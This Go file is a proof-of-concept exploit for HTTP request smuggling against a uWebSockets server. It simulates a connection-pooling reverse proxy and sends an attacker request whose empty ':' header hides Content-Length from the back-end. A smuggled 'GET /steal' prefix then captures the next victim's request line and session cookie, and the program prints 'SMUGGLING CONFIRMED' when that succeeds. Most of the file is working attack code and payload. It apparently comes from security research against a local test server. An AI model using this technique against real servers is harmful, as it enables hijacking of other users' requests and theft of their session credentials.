// Self-contained end-to-end request-smuggling demo against the REAL uWebSockets
// back-end (:9001). No second listener (the sandbox kills those), so the
// vulnerable reverse proxy is modeled as an in-process forwarder -- but it behaves
// exactly like a network proxy for the purpose of the attack:
//
//   * it holds ONE back-end connection and REUSES it across all clients (pooling),
//   * it frames each client request by Content-Length and forwards the bytes
//     VERBATIM (no re-normalization) -- so any parser disagreement survives.
//
// Actors: ATTACKER client, VICTIM client, the pooling proxy, and uWebSockets.
//
// The attacker's request uses an empty header name (":") that hides Content-Length
// from uWebSockets, so uWS treats the request as body-less and re-parses the
// "body" as a smuggled request -- which then absorbs the victim's request off the
// shared connection.
package main

import (
	"bufio"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

func readHead(r *bufio.Reader) ([]byte, int) {
	var raw []byte
	cl := 0
	for {
		line, err := r.ReadBytes('\n')
		if err != nil {
			return raw, cl
		}
		raw = append(raw, line...)
		t := strings.TrimRight(string(line), "\r\n")
		if t == "" {
			return raw, cl
		}
		if i := strings.IndexByte(t, ':'); i > 0 {
			if strings.ToLower(strings.TrimSpace(t[:i])) == "content-length" {
				cl, _ = strconv.Atoi(strings.TrimSpace(t[i+1:]))
			}
		}
	}
}
func readN(r *bufio.Reader, n int) []byte {
	if n <= 0 {
		return nil
	}
	b := make([]byte, n)
	got := 0
	for got < n {
		m, err := r.Read(b[got:])
		got += m
		if err != nil {
			break
		}
	}
	return b[:got]
}

// The vulnerable pooling proxy: ONE reused back-end connection.
type proxy struct {
	bc net.Conn
	br *bufio.Reader
}

// forward frames the client's request by Content-Length and passes the bytes
// through verbatim, then returns the back-end's single response body.
func (p *proxy) forward(clientTag, clientReq string) string {
	cr := bufio.NewReader(strings.NewReader(clientReq))
	head, cl := readHead(cr)
	body := readN(cr, cl)
	req := append(append([]byte{}, head...), body...)
	fmt.Printf("[PROXY] %s: framed request as %d header/body bytes (CL=%d); forwarding verbatim over the ONE pooled backend conn\n", clientTag, len(req), cl)
	p.bc.Write(req)
	rhead, rcl := readHead(p.br)
	rbody := readN(p.br, rcl)
	_ = rhead
	return strings.TrimRight(string(rbody), "\n")
}

func main() {
	bc, err := net.Dial("tcp", "127.0.0.1:9001")
	if err != nil {
		fmt.Println("no backend on 9001:", err)
		return
	}
	defer bc.Close()
	p := &proxy{bc: bc, br: bufio.NewReader(bc)}

	CRLF := "\r\n"
	smug := "GET /steal HTTP/1.1" + CRLF + "X-Smuggled: " // smuggled prefix: no Host, ends mid-header
	attacker := "POST /benign HTTP/1.1" + CRLF + "Host: t" + CRLF + ":" + CRLF +
		"Content-Length: " + strconv.Itoa(len(smug)) + CRLF + CRLF + smug
	victim := "GET /account HTTP/1.1" + CRLF + "Host: t" + CRLF + "Cookie: victim-secret-cookie" + CRLF + CRLF

	fmt.Println("=== 1) ATTACKER sends ONE request through the proxy ===")
	fmt.Println("       (the ':' line hides Content-Length from uWebSockets)")
	ra := p.forward("ATTACKER", attacker)
	fmt.Printf(">>> ATTACKER received:  %s\n\n", ra)

	time.Sleep(150 * time.Millisecond)

	fmt.Println("=== 2) VICTIM sends a NORMAL request through the SAME proxy ===")
	rv := p.forward("VICTIM ", victim)
	fmt.Printf(">>> VICTIM received:    %s\n\n", rv)

	fmt.Println("[VERDICT]")
	if strings.Contains(rv, "url=/steal") && strings.Contains(rv, "victim-secret-cookie") {
		fmt.Println("  *** SMUGGLING CONFIRMED ***")
		fmt.Println("  The VICTIM asked for /account but was answered by the attacker's smuggled")
		fmt.Println("  /steal request -- and the victim's request-line + session cookie were")
		fmt.Println("  captured INTO that attacker-controlled request (see x-smuggled / cookie above).")
	} else {
		fmt.Println("  No smuggling observed (victim got its own response).")
	}
}
